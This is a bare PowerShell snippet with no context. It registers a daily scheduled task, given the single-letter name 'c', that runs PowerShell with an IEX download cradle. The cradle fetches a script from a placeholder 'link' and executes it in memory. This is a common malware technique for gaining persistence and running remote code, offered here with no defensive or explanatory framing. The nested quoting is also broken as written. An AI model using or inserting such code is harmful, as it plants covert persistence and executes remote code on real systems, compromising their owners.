$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('link');'

$trigger = New-ScheduledTaskTrigger -Daily -At 11am

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "c"